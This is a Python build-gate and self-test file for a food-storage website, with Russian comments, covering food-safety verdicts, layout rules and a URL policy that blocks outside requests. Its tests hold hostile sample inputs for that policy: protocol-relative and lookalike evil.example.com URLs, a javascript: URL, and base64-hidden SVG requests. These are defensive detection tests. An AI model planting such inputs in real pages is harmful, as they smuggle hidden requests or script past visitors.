    ("карточка шаринга совпадает с головой", g_share_card),
    ("адрес почты на своём домене", g_contact_is_on_this_domain),
    ("источник назван и проверяем", g_source_is_citable),
    ("витрина печатает связывающее окно", g_listing_is_binding),
    ("величина списка есть на странице цели",
     g_listing_value_is_on_target),
    ("расчёт даёт напечатанное число", g_ratio_recomputes),
    ("бирка и проза называют одну кратность", g_ratio_agrees_with_prose),
    ("на предел в тепле не делят", g_safety_limit_not_divided),
    ("доля не печатается на краю", g_no_empty_percentile),
    ("слова источника напечатаны прозой", g_tips_are_prose),
    ("нечисловой ответ назван", g_says_is_named),
    ("главная не спорит со страницами", g_home_superlative),
    ("оговорка соответствует своему окну", g_caveat_matches_window),
    ("вердикт выведен из еды, а не из папки", g_verdict_comes_from_the_food),
    ("объяснение и вердикт из одного признака",
     g_reason_agrees_with_the_verdict),
    ("за страницу отвечает ведущее состояние",
     g_lead_state_speaks_for_the_page),
    ("сказанное о выборе вида совпадает с видом",
     g_choice_matches_the_state),
    ("страница говорит, что делать дальше", g_now_what_is_answered),
    ("общая фраза объявлена", g_std_is_declared),
    ("сужение отношения названо", g_scope_is_named),
    ("запрет морозилки объяснён", g_no_freeze_is_explained),
    ("строк списка вне списка нет", g_li_in_a_list),
    ("отступы выведены из одной базы", g_spacing_from_one_unit),
    ("кегли взяты из шкалы", g_type_scale),
    ("трекинг не наследуется потомку", g_tracking_is_not_inherited),
    ("бирка помещается на один экран", g_label_fits_one_screen),
    ("счёт отвечает на своё утверждение", g_count_answers_its_claim),
    ("строки имён сверены с источником", g_name_rows_match_source),
    ("близнецы по всему видимому тексту", g_twins_full_page),
    ("сроки заголовка и описания стоят величиной",
     g_head_numbers_are_owned),
    ("части строки бланка стоят в строке", g_row_parts_in_a_row),
    ("молчание источника подтверждено источником",
     g_silence_matches_the_source),
    ("реклама не налезает и не обрезана", g_ad_slots_do_not_overlap),
    ("поиск находит каждую выпущенную страницу",
     g_search_finds_every_page),
    ("выкладка совпадает с генератором", g_dist_matches_build),
]

GATE_COUNT = 79          # гейт, переставший запускаться, выглядит пройденным

DOMAIN_HINT = ["keepsuntil.com"]


def run(files, quiet=False):
    assert len(GATES) == GATE_COUNT, \
        "гейтов %d, объявлено %d" % (len(GATES), GATE_COUNT)
    failed = 0
    for name, fn in GATES:
        del _SAMPLE[:]
        problems = list(fn(files))
        sample = list(_SAMPLE)
        if not problems and not sample:
            # Гейт не назвал размер выборки. Это не придирка к стилю: пока
            # его нет, «пройден» означает либо «нарушений нет», либо «я
            # ничего не посмотрел», и различить их нечем. Спрашивается это
            # только с ЗЕЛЁНОГО гейта: нашедший нарушение смотрел заведомо
            # не в пустоту, и требовать с него ещё и объявления значило бы
            # печатать вторую жалобу о первой.
            problems = ["гейт не назвал размер выборки: ни одного вызова "
                        "_seen на чистой сборке"]
        if problems:
            failed += 1
            if not quiet:
                print("  ПРОВАЛ  %s%s" % (name, _sample_note(sample)))
                for x in problems[:5]:
                    print("          %s" % x)
                if len(problems) > 5:
                    print("          ... и ещё %d" % (len(problems) - 5))
        elif not quiet:
            print("  пройден %s%s" % (name, _sample_note(sample)))
    return failed


def _sample_note(sample):
    """«· выборка 296 страниц товаров» — то, что гейт ДЕЙСТВИТЕЛЬНО посмотрел."""
    if not sample:
        return ""
    return " · выборка " + ", ".join("%d %s" % (n, what) for n, what in sample)


# ------------------------------------------------------------- отпечаток

def content_hash(files, content_date):
    """Отпечаток СОДЕРЖИМОГО без самой даты: иначе сдвиг даты меняет хеш, хеш
    оправдывает сдвиг даты, и проверка сверяется сама с собой."""
    body = "".join(x for p, x in sorted(files.items())
                   if not p.endswith(("sitemap.xml", "robots.txt")))
    body = body.replace(content_date.isoformat(), "")
    body = body.replace(content_date.strftime("%d %B %Y"), "")
    return hashlib.sha256(body.encode("utf-8")).hexdigest()[:16]


def stamp_verdict(new_hash, content_date, old, today=None):
    """ЧИСТАЯ функция: по прошлому отпечатку и нынешнему сказать, врёт ли дата.

    Вынесена отдельно, чтобы её можно было проверить ИЗВЕСТНЫМИ ОТВЕТАМИ. Пока
    она жила внутри записи на диск, проверить её было нечем: любой прогон
    переписывал эталон, и второй прогон всегда проходил.

    Дата содержимого — обещание «в этот день сайт менялся последний раз», и
    оно уходит в lastmod карты. Ложно оно только тогда, когда содержимое
    поменялось ПОЗЖЕ названного дня: правка в тот же день, который дата и
    называет, ничего не устаревает. Поэтому сверяемся с ЧАСАМИ, а не со своим
    же вводом.
    """
    if not old or old["hash"] == new_hash:
        return None
    if old["date"] != content_date.isoformat():
        return None
    if today is not None and content_date >= today:
        return None
    return ("содержимое изменилось, а CONTENT_DATE осталась %s — "
            "сдвиньте её в render.py" % content_date.isoformat())


def stamp(files, content_date):
    """Содержимое изменилось — дата содержимого обязана сдвинуться.

    Дата, стоящая при изменившемся тексте, врёт ровно так же, как дата,
    двигающаяся при неизменном. Отпечаток лежит ВНЕ каталога выкладки: однажды
    он уехал на сайт вместе со страницами.
    """
    h = content_hash(files, content_date)
    if not os.path.isdir(STAMP_DIR):
        os.makedirs(STAMP_DIR)
    path = os.path.join(STAMP_DIR, "keepsuntil.json")
    old = None
    if os.path.isfile(path):
        old = json.load(io.open(path, encoding="utf-8"))
    from datetime import date as _today
    verdict = stamp_verdict(h, content_date, old, _today.today())
    # Эталон переписывается ТОЛЬКО когда сверка прошла. Пока он
    # переписывался всегда, гейт стирал собственную улику: первый прогон
    # краснел, второй проходил на том же несдвинутом CONTENT_DATE, и в CI
    # виден был только второй.
    if verdict is None:
        io.open(path, "w", encoding="utf-8", newline="\n").write(
            json.dumps({"hash": h, "date": content_date.isoformat()}, indent=1))
    return verdict


def pure_selftest():
    """ИЗВЕСТНЫЕ ОТВЕТЫ чистым функциям, от которых зависят гейты.

    ПОЧЕМУ ЭТО ОТДЕЛЬНАЯ ПРОВЕРКА. Гейт, который берёт ожидаемое значение у
    той же функции, что напечатала проверяемое, СОГЛАСЕН САМ С СОБОЙ: сломай
    функцию — сломается и страница, и ожидание, и гейт останется зелёным. У
    нас такой уже был, и не один. Здесь перечислены все функции, на которых
    это сходится, и у каждой ответы написаны РУКАМИ, а не получены вызовом:

      · render.shingles / shingles_num / jaccard — ими и меряет гейт
        близнецов, и ими же сборка ОТБИРАЕТ корпус. Сломанный jaccard пустил
        бы в корпус кого угодно и оставил бы гейт зелёным;
      · render.page_text — что именно снимается с текста перед сравнением;
      · design.text_width / line_count — ими проза ВЫБИРАЕТ кегль крупной
        строки и ими же гейт проверяет высоту бирки: обе стороны одной
        линейки;
      · foodkeeper._parse_range / _ratio — единственные разбор и деление;
      · prose.mult — слова кратности, которые гейт витрины сверяет с биркой;
      · собственные чистые функции гейтов: цвет, вместимость колонки,
        видимый текст, ходьба по стеку, сопоставитель поиска.
    """
    import design
    import foodkeeper as fkm
    import prose as prm
    import render as rd

    A = design.ADVANCE
    D = design.ADV_DEFAULT
    cases = []

    def eq(name, got, want, ne=False):
        """Известный ответ. `ne` — известный НЕответ: «что угодно, только не

        это». Нужен там, где верных ответов несколько, а неверный один и
        назван: соевое молоко — не животная еда, а какая именно, решает
        лестница, и вписывать сюда её выбор значило бы проверять лестницу
        лестницей."""
        if ne:
            cases.append((name, got != want, True))
        else:
            cases.append((name, got, want))

    # --- отпечатки текста и сходство
    eq("shingles: пять слов дают одну черепицу",
       rd.shingles("alpha bravo charlie delta echo"),
       {("alpha", "bravo", "charlie", "delta", "echo")})
    eq("shingles: четырёх слов не хватает",
       rd.shingles("alpha bravo charlie delta"), set())
    eq("shingles: числа выброшены",
       rd.shingles("alpha 7 bravo charlie delta echo"),
       {("alpha", "bravo", "charlie", "delta", "echo")})
    eq("shingles: регистр не важен",
       rd.shingles("ALPHA Bravo charlie delta echo"),
       {("alpha", "bravo", "charlie", "delta", "echo")})
    eq("shingles_num: числа остаются словами",
       rd.shingles_num("alpha 7 bravo charlie delta"),
       {("alpha", "7", "bravo", "charlie", "delta")})
    eq("jaccard: пусто на пусто — ноль", rd.jaccard(set(), set()), 0.0)
    eq("jaccard: одно и то же — единица", rd.jaccard({1, 2}, {1, 2}), 1.0)
    eq("jaccard: одна общая из трёх", rd.jaccard({1, 2}, {2, 3}), 1.0 / 3)
    eq("jaccard: ничего общего", rd.jaccard({1}, {2}), 0.0)

    # --- что снимается с текста страницы
    eq("page_text: стиль и скрипт вырезаны",
       rd.page_text("<body><style>p{text-align:right}</style>"
                    "<script>var x=1</script><p>hello there</p></body>"),
       "hello there")
    eq("page_text: подвал снят",
       rd.page_text('<body><p>own words</p>'
                    '<footer class="foot">shared tail</footer></body>'),
       "own words")
    eq("page_text: объявленный общим раздел снят",
       rd.page_text("<body><p>own words</p>"
                    "<section data-shared><p>everyone</p></section></body>"),
       "own words")

    # --- линейка облика: ширина знаков и перенос
    eq("text_width: пустая строка — ноль", design.text_width("", 12), 0.0)
    eq("text_width: сумма продвижений", design.text_width("AB", 10),
       10 * (A["A"] + A["B"]))
    eq("text_width: строчные считаются как заглавные",
       design.text_width("ab", 10), design.text_width("AB", 10))
    eq("text_width: трекинг добавляется после КАЖДОГО знака",
       design.text_width("AB", 10, 0.1), 10 * (A["A"] + A["B"]) + 10 * 0.1 * 2)
    eq("text_width: незнакомый знак считается широким",
       design.text_width(chr(1071), 10), 10 * D)
    eq("line_count: пустая строка — одна строка",
       design.line_count("", 12, 0, 100), 1)
    eq("line_count: нулевая колонка — одна строка",
       design.line_count("alpha bravo", 12, 0, 0), 1)
    eq("line_count: в широкой колонке всё в одну",
       design.line_count("alpha bravo charlie", 12, 0, 100000), 1)
    eq("line_count: в узкой колонке каждое слово своей строкой",
       design.line_count("alpha bravo charlie", 12, 0, 1), 3)

    # --- разбор источника и единственное деление
    eq("_parse_range: пусто — ничего", fkm._parse_range(""), None)
    eq("_parse_range: пробелы — ничего", fkm._parse_range("   "), None)
    eq("_parse_range: «3 - 5 Weeks» -> 21..35 дней",
       fkm._parse_range("3 - 5 Weeks")[:2], (21.0, 35.0))
    eq("_parse_range: единица источника сохранена",
       fkm._parse_range("3 - 5 Weeks")[2], "weeks")
    eq("_parse_range: одно число — низ равен верху",
       fkm._parse_range("2 Days")[:2], (2.0, 2.0))
    eq("_parse_range: «Not Recommended» — так не хранят",
       fkm._parse_range("Not Recommended"), ("no", None))
    eq("_ratio: 90 дней против 3 — тридцать",
       fkm._ratio(("fridge", (3.0, 3.0)), ("freeze", (30.0, 90.0)))[0], 30.0)
    eq("_ratio: на предел опасной зоны не делят",
       fkm._ratio(("pantry", (0.08, 0.08)), ("freeze", (30.0, 90.0))), None)
    eq("_ratio: пустой знаменатель — ничего",
       fkm._ratio(None, ("freeze", (30.0, 90.0))), None)

    # --- ЧТО ЗНАЧИТ ОКНО: последствие считает одна функция, и ответы ей
    #     написаны РУКАМИ. Правило — лестница из свойств еды и ста тридцати
    #     объявленных слов; второй рукописной копией его не проверить, а
    #     известными ответами — можно, и обе стороны здесь есть.
    def fkind(name, cat, key, hi, sub=""):
        it = {"name": name, "category": cat, "subcategory": "",
              "subtitle": sub, "slots": {}}
        return fkm.food_kind(it, key, hi)[0]

    eq("вердикт: вскрытая банка рыбы — предел безопасности",
       fkind("Seafood, canned", "Shelf Stable Foods", "fridge_open", 2.0),
       "safety")
    eq("вердикт: вскрытая банка курицы — тот же предел",
       fkind("Canned chicken", "Poultry", "fridge_open", 4.0), "safety")
    eq("вердикт: малокислотные консервы вскрыты — предел",
       fkind("Canned goods", "Shelf Stable Foods", "fridge_open", 4.0,
             "low acid (such as meat, poultry, fish, gravy)"), "safety")
    eq("вердикт: домашний айоли на сыром яйце — предел",
       fkind("Aioli, homemade", "Condiments, Sauces & Canned Goods",
             "fridge", 4.0), "safety")
    eq("вердикт: варёная киноа — предел",
       fkind("Quinoa", "Grains, Beans & Pasta", "fridge", 7.0, "cooked"),
       "safety")
    eq("вердикт: разрезанная фруктовая нарезка — предел",
       fkind("Fruit, cut", "Deli & Prepared Foods", "fridge_open", 4.0),
       "safety")
    eq("вердикт: вскрытая баночка детского пюре — предел",
       fkind("Fruit", "Baby Food", "fridge_open", 3.0), "safety")
    eq("вердикт: два часа в тепле — предел, а не срок",
       fkind("Pies", "Baked Goods", "pantry", 2 / 24.0, "mincemeat"),
       "safety")
    eq("вердикт: морозилка сырой курицы — окно качества",
       fkind("Chicken", "Poultry", "freeze_purchase", 360.0), "quality")
    eq("вердикт: вскрытое красное вино — окно качества",
       fkind("Red wine", "Beverages", "fridge_open", 3.0), "quality")
    eq("вердикт: мёд в шкафу — окно качества",
       fkind("Honey", "Condiments, Sauces & Canned Goods", "pantry", 730.0),
       "quality")
    eq("вердикт: целый сырой лук в холодильнике — окно качества",
       fkind("Onions", "Produce", "fridge_purchase", 60.0), "quality")
    eq("вердикт: вытопленный жир — окно качества",
       fkind("Bacon grease", "Condiments, Sauces & Canned Goods", "fridge",
             180.0), "quality")

    # --- ЧТО ЭТО ЗА ЕДА: признак, из которого печатается объяснение.
    #
    # Двенадцать растительных продуктов объявлялись животной едой, и увидеть
    # это можно, только НАЗВАВ ответ: правило длинное, а вопрос короткий —
    # сделана эта еда из животного или нет. Обе стороны здесь есть: без
    # положительных ответов правило, никогда не говорящее «животная еда»,
    # прошло бы эту проверку целиком.
    def nat(name, cat, key="fridge", sub="", tips=None):
        it = {"name": name, "category": cat, "subcategory": "",
              "subtitle": sub, "slots": {}, "tips": tips or {}}
        return fkm.food_nature(it, key)

    for _nm, _cat, _sub in (
            ("Vegan Cheddar Cheese", "Dairy Products & Eggs", ""),
            ("Soy milk", "Dairy Products & Eggs", ""),
            ("Almond milk", "Dairy Products & Eggs", ""),
            ("Coconut milk", "Dairy Products & Eggs", ""),
            ("Coconut cream", "Shelf Stable Foods", "canned"),
            ("Bacon bits", "Meat", "imitation")):
        eq("признак: %s — НЕ животная еда" % _nm,
           nat(_nm, _cat, sub=_sub), "animal", ne=True)

    eq("признак: заварной пирог остаётся животной едой среди кокосовых начинок",
       nat("Cream pies", "Baked Goods",
           sub="banana cream, coconut cream, butterscotch"), "animal")
    eq("признак: сырая курица — животная еда",
       nat("Chicken", "Poultry", sub="whole"), "animal")
    eq("признак: твёрдый сыр — животная еда",
       nat("Cheese", "Dairy Products & Eggs", sub="hard such as cheddar"),
       "animal")
    eq("признак: рубрика называется своим именем, а не «животная еда»",
       nat("Miso", "Vegetarian Proteins"), "perishable folder")
    eq("признак: заметка источника про готовый продукт сильнее слова в имени",
       nat("Dry gravy mixes", "Condiments, Sauces & Canned Goods",
           tips={"fridge": "Refrigeration time applies to prepared "
                           "product."}), "after cooking")
    eq("признак: источник сам сказал «качество, а не безопасность»",
       nat("Mayonnaise", "Condiments, Sauces & Canned Goods",
           key="fridge_open",
           tips={"pantry": "Refrigeration ensures freshness. Quality, not "
                           "safety, is the reason the labels on these "
                           "products suggest that they be refrigerated "
                           "after opening."}), "source says quality")

    # --- ДЛИНА ОКНА ТОЛЬКО СМЯГЧАЕТ, и обе половины этого написаны руками.
    eq("вердикт: два года в холодильнике — не предел безопасности",
       fkind("Ghee", "Dairy Products & Eggs", "fridge", 730.0), "quality")
    eq("вердикт: три недели в холодильнике — ещё предел",
       fkind("Eggs", "Dairy Products & Eggs", "fridge_purchase", 35.0),
       "safety")
    eq("вердикт: длина снимает предупреждение и не ставит его",
       fkind("Bread", "Baked Goods", "fridge", 2.0), "unsettled")
    eq("вердикт: та же еда с длинным окном — тот же ответ",
       fkind("Bread", "Baked Goods", "fridge", 90.0), "unsettled")

    # --- ОБЪЯСНЕНИЕ И ВЕРДИКТ ИЗ ОДНОГО ПРИЗНАКА: рамка не подставная.
    eq("объяснение: животная еда названа животной",
       fkm.reason_clause("animal", {"name": "Chicken"}),
       "What decides that is the food and not the shelf the source files it "
       "on: Chicken is an animal food, or made with one.")
    eq("объяснение: рубрика названа рубрикой, а не едой",
       fkm.reason_clause("perishable folder",
                         {"name": "Miso", "category": "Vegetarian Proteins"}),
       "What decides that is the food: the source files Miso under "
       "Vegetarian Proteins, a heading it keeps for perishable food.")

    # --- ЗА КАКОЙ ВИД ГОВОРИТ СТРАНИЦА
    #
    # Значение простого слова ОБЪЯВЛЕНО (fk.PLAIN_MEANS), и известные ответы
    # спрашивают у объявления ровно три вещи: что оно выбирает названную
    # строку, что «говорить некому» отличается от «выбрана первая» и что
    # необъявленное имя РОНЯЕТ сборку, а не выбирает молча.
    _eggs = [{"id": "21", "name": "Eggs", "subtitle": "in shell",
              "slots": {"fridge_purchase": (21.0, 35.0)}},
             {"id": "22", "name": "Eggs", "subtitle": "raw whites, yolks",
              "slots": {"fridge": (2.0, 4.0)}},
             {"id": "23", "name": "Eggs", "subtitle": "hard boiled cooked",
              "slots": {"fridge": (7.0, 7.0)}}]
    eq("значение слова: яйца в скорлупе, а не сырые белки",
       fkm.plain_row(_eggs)["subtitle"], "in shell")
    eq("значение слова: у продукта из одной строки объявления не спрашивают",
       fkm.plain_row(_eggs[1:2])["id"], "22")
    eq("значение слова: SPLIT значит «говорить некому»",
       fkm.plain_row([{"id": "34", "name": "Beef", "subtitle": "rib roast",
                       "slots": {"fridge_purchase": (3.0, 5.0)}},
                      {"id": "43", "name": "Beef", "subtitle": "ground",
                       "slots": {"fridge_purchase": (1.0, 2.0)}}]), None)

    def _undeclared():
        try:
            fkm.plain_row([{"id": "1", "name": "Unobtainium sandwich",
                            "subtitle": "a", "slots": {}},
                           {"id": "2", "name": "Unobtainium sandwich",
                            "subtitle": "b", "slots": {}}])
        except fkm.UndeclaredName:
            return "роняет"
        return "выбрала молча"

    eq("значение слова: необъявленное имя роняет сборку",
       _undeclared(), "роняет")

    # --- слова кратности
    eq("mult: круглое печатается целым", prm.mult(4.02), "4 times")
    eq("mult: дробное — с одним знаком", prm.mult(4.3), "4.3 times")
    eq("mult: большое округляется до целого", prm.mult(11.4), "11 times")

    # --- собственные чистые функции гейтов
    eq("_seen: ноль — провал", bool(_seen(0, "x")), True)
    eq("_seen: не ноль — пройдено", _seen(3, "x"), [])
    eq("_visible: стиль не даёт слов",
       _visible("<style>p{text-align:right}</style><p>the answer</p>"),
       " the answer ")
    eq("_visible: сущности разворачиваются",
       _visible("<p>a &amp; b</p>"), " a & b ")
    eq("_page_type: метка читается",
       _page_type('<meta name="page-type" content="product">'), "product")
    eq("_page_type: метки нет — пусто", _page_type("<html>"), "")
    eq("_ad_divs: место и его содержимое",
       _ad_divs('<div class="ad ad-flow">house</div>'),
       [("ad-flow", "house")])
    eq("_main_text: главного элемента нет — None",
       _main_text("<body><p>x</p></body>"), None)
    eq("_main_text: берётся только главный элемент",
       _main_text("<body><p>outside</p><main><p>inside</p></main></body>"),
       " inside "),
    eq("_parse_color: три знака разворачиваются",
       _parse_color("#fff"), (255, 255, 255, 1.0))
    eq("_parse_color: шесть знаков", _parse_color("#000000"), (0, 0, 0, 1.0))
    eq("_parse_color: альфа читается",
       _parse_color("rgba(0,0,0,.5)"), (0.0, 0.0, 0.0, 0.5))
    eq("_contrast: чёрное на белом — 21:1",
       round(_contrast((0, 0, 0), (255, 255, 255)), 2), 21.0)
    eq("_contrast: одинаковые — 1:1",
       round(_contrast((18, 18, 18), (18, 18, 18)), 2), 1.0)
    eq("_over: половина чёрного на белом — серый",
       _over((0, 0, 0, 0.5), (255, 255, 255)), (127.5, 127.5, 127.5))
    eq("_container: на 375px место живёт в листе 359 минус кромка",
       _container("ad-flow", 375), 357)
    eq("_container: на 1440px рельса шириной с бирку",
       _container("ad-rail", 1440), 520)
    eq("_container: на 1440px поток — лист минус бирка и кромка",
       _container("ad-flow", 1440), 598)
    eq("_container: полоса не шире 1120",
       _container("ad-lead", 1440), 1120)
    eq("_cap_names: полное имя совпадает",
       _cap_names("In the fridge", "In the fridge"), True)
    eq("_cap_names: обрезка — начало и хвост",
       _cap_names("In the%s fridge" % _CUT, "In the very cold fridge"), True)
    eq("_cap_names: чужой хвост не проходит",
       _cap_names("In the%s freezer" % _CUT, "In the very cold fridge"), False)
    eq("_css_blocks: media-блок помнит свою ширину",
       _css_blocks("@media (min-width:600px){.a{width:1px}}"),
       [(600, ".a", "width:1px")])
    eq("_slot_sizes: размер места по разобранному CSS",
       _slot_sizes(".ad-flow{width:300px;height:250px}"),
       {"ad-flow": {0: (300, 250)}})
    eq("_grid_cells: одна клетка",
       _grid_cells("grid-column:1;grid-row:2"), {(1, 2)})
    eq("_grid_cells: span занимает две",
       _grid_cells("grid-column:2;grid-row:1/span 2"), {(2, 1), (2, 2)})
    eq("_grid_cells: без объявления — None",
       _grid_cells("color:red"), None)
    eq("_raw_is_a_figure: число — да", _raw_is_a_figure("3 - 5 Weeks"), True)
    eq("_raw_is_a_figure: пусто — нет", _raw_is_a_figure(""), False)
    eq("_raw_is_a_figure: «Not Recommended» — нет",
       _raw_is_a_figure("Not Recommended"), False)
    eq("_owned_numbers: величина поля прочитана",
       _owned_numbers('<div class="dur">4 days</div>'), {"4"})
    eq("_owned_numbers: проза не владеет числом",
       _owned_numbers("<p>4 days</p>"), set())
    st = _stack_walk('<div class="a"><ul class="rows"><li>'
                     '<span class="rk">k</span></li></ul></div>')
    eq("_stack_walk: предки читаются классами",
       [x[2] for x in st if "rk" in x[1]], [["a", "rows"]])
    eq("_stack_walk: закрытый тег уходит со стека",
       [x[1] for x in _stack_walk("<p></p><b></b>")], [[], []])
    eq("_f_score: точное совпадение — пять", _f_score("milk", "milk"), 5)
    eq("_f_score: начало имени — четыре", _f_score("mil", "milk"), 4)
    # Перестановка соседних букв стоит ДВУХ правок, и сопоставитель её не
    # прощает: одна правка — это замена. Ждал два, получил ноль — ошибалась
    # проверка, а не функция.
    eq("_f_score: одна замена — два", _f_score("milc", "milk"), 2)
    eq("_f_score: перестановка — не одна правка", _f_score("mikl", "milk"), 0)
    eq("_f_score: ничего общего — ноль", _f_score("beef", "milk"), 0)
    eq("_f_ed1: одна замена", _f_ed1("milk", "milt"), 1)
    eq("_f_ed1: две правки — нет", _f_ed1("milk", "mint"), 0)
    ent = _f_entries([["Milk", "/milk/", "5 days", ["dairy milk"]],
                      ["Beef", "/beef/", "4 days", []]])
    eq("_f_find: имя находит свою страницу",
       _f_find("milk", ent, set()), ["/milk/"])
    eq("_f_find: псевдоним находит свою страницу",
       _f_find("dairy milk", ent, set())[0], "/milk/")
    eq("_f_find: пустой запрос — ничего", _f_find("", ent, set()), [])
    eq("_f_find: слово-обрамление не мешает",
       _f_find("how long does beef keep", ent,
               set(_f_toks("how long does keep")))[0], "/beef/")


    # --- ЧТО СЧИТАЕТСЯ УХОДОМ НАРУЖУ. Гейт внешних адресов целиком стоит на
    #     `_fetch_verdict`, а сломан он был ровно в ОДНОЙ строке порядка:
    #     «/» проверялось раньше «//», и протокол-относительный адрес считался
    #     своим путём. Здесь ответы написаны РУКАМИ, оригины переданы явно —
    #     проверка не зависит от того, что сегодня стоит в render.py.
    _O = ("https://keepsuntil.com",)
    _L = {"https://www.foodsafety.gov/x"}

    def fv(u, mode="res"):
        return _fetch_verdict(u, mode, _O, _L)

    eq("адрес: свой путь от корня", fv("/milk/"), None)
    eq("адрес: якорь", fv("#top"), None)
    eq("адрес: свой оригин целиком", fv("https://keepsuntil.com/milk/"), None)
    eq("адрес: свой оригин без схемы", fv("//keepsuntil.com/milk/"), None)
    eq("адрес: ПРОТОКОЛ-ОТНОСИТЕЛЬНЫЙ — наружу",
       fv("//evil.example.com/p.gif"), "протокол-относительный адрес")
    eq("адрес: обратные слэши браузер читает как прямые",
       fv(chr(92) * 2 + "evil.example.com/p.gif"),
       "протокол-относительный адрес")
    eq("адрес: похожий хост — не наш хост",
       fv("https://keepsuntil.com.evil.example.com/x.png"),
       "чужой адрес со схемой")
    eq("адрес: имя хоста без схемы", fv("evil.example.com/p.gif"),
       "имя хоста без схемы")
    eq("адрес: путь не от корня", fv("images/x.png"),
       "адрес не от корня сайта")
    eq("адрес: пустой", fv(""), "пустой адрес")
    eq("адрес: javascript исполняется", fv("javascript:alert(1)"),
       "исполняемый адрес")
    eq("адрес: управляющий байт внутри схемы не спасает",
       fv("htt" + chr(9) + "ps://evil.example.com/"),
       "чужой адрес со схемой")
    eq("адрес: цитата ПО КЛИКУ разрешена",
       fv("https://www.foodsafety.gov/x", "link"), None)
    eq("адрес: та же цитата ЗАГРУЗКОЙ запрещена",
       fv("https://www.foodsafety.gov/x", "res"), "чужой адрес со схемой")
    eq("адрес: почта в ссылке", fv("mailto:a@b.com", "link"), None)
    eq("адрес: почта там, куда идёт браузер", fv("mailto:a@b.com", "res"),
       "почта там, где браузер идёт сам")
    eq("адрес: объявленная встроенная картинка",
       fv("data:image/svg+xml,%3Csvg%3E%3C/svg%3E"), None)
    eq("адрес: data другого вида", fv("data:text/html,%3Cb%3E"),
       "data: не объявленного вида (data:text/html)")
    eq("встроенная картинка: xmlns запросом не является",
       _data_verdict("data:image/svg+xml,%3Csvg%20xmlns=%27http://www.w3."
                     "org/2000/svg%27%3E%3C/svg%3E"), None)
    eq("встроенная картинка: запрос внутри неё",
       _data_verdict("data:image/svg+xml,%3Cimage%20href=%27https://e/x%27/"
                     "%3E"),
       "во встроенной картинке спрятан запрос (https://)")
    # РАЗВЁРТКА BASE64. Гейт снимал проценты и мнемоники и не снимал
    # base64, хотя объявляет его сам адрес: метки честно просматривали
    # base64-текст и честно ничего не находили.
    _b_ok = base64.b64encode(
        '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>'
        .encode("utf-8")).decode("ascii")
    _b_bad = base64.b64encode(
        '<svg><image href="https://evil.example.com/x"/></svg>'
        .encode("utf-8")).decode("ascii")
    _b_in = base64.b64encode(
        '<use href="https://evil.example.com/x"/>'
        .encode("utf-8")).decode("ascii")
    _b_nest = base64.b64encode(
        ("<svg>data:image/svg+xml;base64,%s</svg>" % _b_in)
        .encode("utf-8")).decode("ascii")
    eq("base64: разворачивается", _b64_text("aGVsbG8="), "hello")
    eq("base64: хвостовые знаки дописываются", _b64_text("aGVsbG8"), "hello")
    eq("base64: не разбирается — пусто", _b64_text("!!!"), "")
    eq("встроенная картинка: чистая base64 проходит",
       _data_verdict("data:image/svg+xml;base64," + _b_ok), None)
    eq("встроенная картинка: запрос, спрятанный в base64",
       _data_verdict("data:image/svg+xml;base64," + _b_bad),
       "во встроенной картинке спрятан запрос (https://)")
    eq("встроенная картинка: base64url читается так же",
       _data_verdict("data:image/svg+xml;base64,"
                     + _b_bad.replace("+", "-").replace("/", "_")),
       "во встроенной картинке спрятан запрос (https://)")
    eq("встроенная картинка: base64 внутри base64",
       _data_verdict("data:image/svg+xml;base64," + _b_nest),
       "внутри встроенной картинки: во встроенной картинке спрятан "
       "запрос (https://)")
    eq("встроенная картинка: base64 не разбирается — это отказ",
       _data_verdict("data:image/svg+xml;base64,!!!"),
       "встроенная картинка объявлена base64 и не разбирается")
    eq("политика: адрес отчёта виден",
       _csp_report_urls("default-src 'none'; report-uri //e/r"), ["//e/r"])
    eq("политика: отчёта нет — пусто",
       _csp_report_urls("default-src 'none'"), [])
    eq("оригин: свой", _origin_verdict("https://keepsuntil.com/x", _O, "чужой"),
       None)
    eq("оригин: приставленный хвост не свой",
       _origin_verdict("https://keepsuntil.com.evil.example.com/x", _O,
                       "чужой"), "чужой")

    # --- разбор разметки: браузеру всё равно, какие кавычки
    eq("атрибуты: двойные кавычки", _tag_attrs(' src="/a" alt="b"'),
       {"src": "/a", "alt": "b"})
    eq("атрибуты: одинарные кавычки", _tag_attrs(" src='/a'"), {"src": "/a"})
    eq("атрибуты: без кавычек", _tag_attrs(" src=/a"), {"src": "/a"})
    eq("атрибуты: имя приводится к нижнему регистру",
       _tag_attrs(" SRC=/a"), {"src": "/a"})
    eq("атрибуты: двоеточие в имени", _tag_attrs(' xlink:href="/a"'),
       {"xlink:href": "/a"})
    eq("теги: имя и атрибуты", list(_tags('<IMG src="/a">')),
       [("img", {"src": "/a"})])
    eq("стиль: url() вынимается", _css_urls("a{background:url(//e/x.png)}"),
       ["//e/x.png"])
    eq("стиль: кавычки внутри url() снимаются",
       _css_urls("a{background:url('/x.png')}"), ["/x.png"])
    eq("стиль: url() нет — пусто", _css_urls("a{color:red}"), [])
    eq("стиль: @import голой строкой",
       _css_imports('@import "//e/i.css";'), ["//e/i.css"])
    eq("стиль: @import через url()", _css_imports("@import url(/i.css);"),
       ["/i.css"])
    eq("стиль: @import нет — пусто", _css_imports("a{color:red}"), [])
    # image-set берёт ГОЛУЮ строку: скобки `url(` в ней нет вовсе, и
    # объявление обещало его на волну раньше, чем код научился читать.
    eq("стиль: image-set голой строкой",
       _css_urls('a{background:image-set("//e/x.png" 1x)}'), ["//e/x.png"])
    eq("стиль: image-set с приставкой производителя",
       _css_urls("a{background:-webkit-image-set('/y.png' 2x)}"), ["/y.png"])
    eq("стиль: image-set через url() — один адрес, не два",
       _css_urls("a{background:image-set(url(/z.png) 1x)}"), ["/z.png"])
    eq("карта модулей: сверяются ЗНАЧЕНИЯ, а не имена",
       _map_urls('{"imports":{"a":"//e/a.js"}}'), ["//e/a.js"])
    eq("карта модулей: сломанную читаем строками",
       _map_urls('{"imports":{"a":"//e/b.js"'),
       ["imports", "a", "//e/b.js"])
    eq("текст: адрес в карте сайта",
       _text_urls("<loc>https://k.com/m/</loc>"), ["https://k.com/m/"])
    eq("текст: пространство имён адресом не является",
       _text_urls('<urlset xmlns="http://www.sitemaps.org/schemas/'
                  'sitemap/0.9">'), [])
    eq("текст: протокол-относительный виден и вне разметки",
       _text_urls("Sitemap: //e/s.xml"), ["//e/s.xml"])
    eq("вид файла: страница", _serve_kind("a/index.html"), "markup")
    eq("вид файла: регистр расширения не важен",
       _serve_kind("style.CSS"), "css")
    eq("вид файла: расширение не объявлено", _serve_kind("logo.webp"), None)
